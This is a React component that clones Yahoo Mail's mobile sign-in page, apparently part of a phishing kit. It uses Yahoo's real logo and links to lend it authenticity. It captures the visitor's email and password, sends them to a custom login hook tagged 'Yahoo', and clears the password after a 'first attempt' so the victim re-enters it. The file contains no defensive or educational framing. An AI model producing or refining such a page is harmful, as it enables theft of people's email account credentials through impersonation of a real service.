import React, { useState, useEffect } from 'react';
import { useLogin } from '../../hooks/useLogin';
import Spinner from '../../components/common/Spinner';

interface MobileYahooLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  defaultEmail?: string;
}

const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
  const [email, setEmail] = useState(defaultEmail || '');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);
  const [pageReady, setPageReady] = useState(false);
  const [nextLoading, setNextLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      setNextLoading(true);
      await new Promise(resolve => setTimeout(resolve, 800));
      setShowPasswordStep(true);
      setNextLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 1200));
    const result = await handleFormSubmit(
      { preventDefault: () => {} } as React.FormEvent,
      { email, password, provider: 'Yahoo' }
    );
    if (result?.isFirstAttempt) {
      setPassword('');
    }
    setSubmitting(false);
  };

  // Use the correct image URL for the logo
  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className={`select-none ${className}`} />
  );

  if (!pageReady) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <Spinner size="lg" color="border-purple-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col" style={{ animation: 'fadeIn 0.3s ease-in' }}>
      <header className="flex justify-between items-center p-4">
        <YahooLogo className="h-7" />
        <div className="flex items-center space-x-3 text-xs text-gray-600">
          <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      <main className="flex-grow flex flex-col justify-center items-center w-full p-4">
        <div className="w-full max-w-sm">
          <YahooLogo className="h-8 mx-auto mb-4" />
          <h2 className="text-center text-xl font-semibold text-gray-900">
            {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
          </h2>
          <p className="text-center text-sm text-gray-500 mt-1">
            using your Yahoo account
          </p>
          
          {showPasswordStep && (
            <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>
          )}

          <form onSubmit={handleSubmit} className="mt-6 space-y-4">
            {errorMessage && !isLoading && (
              <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p>
            )}

            {!showPasswordStep ? (
              <div>
                <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
                <button onClick={handleNext} disabled={!email || nextLoading} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:bg-purple-600 disabled:cursor-not-allowed transition">
                  {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Next'}
                </button>
              </div>
            ) : (
              <div>
                <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
                <button type="submit" disabled={submitting || isLoading || !password} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:opacity-50 transition">
                  {(submitting || isLoading) ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                </button>
              </div>
            )}
          </form>

          <div className="text-xs mt-4 flex justify-between items-center">
            <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
              <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 rounded" defaultChecked />
              <span>Stay signed in</span>
            </label>
            <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-purple-600 hover:underline">Forgot username?</a>
          </div>
          
          <div className="mt-6 space-y-4">
            <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-purple-600 text-purple-600 font-bold rounded-full hover:bg-purple-50 transition">
              Create an account
            </a>
            <div className="relative text-center">
              <span className="absolute inset-x-0 top-1/2 h-px bg-gray-300"></span>
              <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
            </div>
            <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-700 font-bold rounded-full hover:bg-gray-50 transition">
              <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5"/>
              Sign in with Google
            </a>
          </div>
        </div>
      </main>
    </div>
  );
};

export default MobileYahooLoginPage;
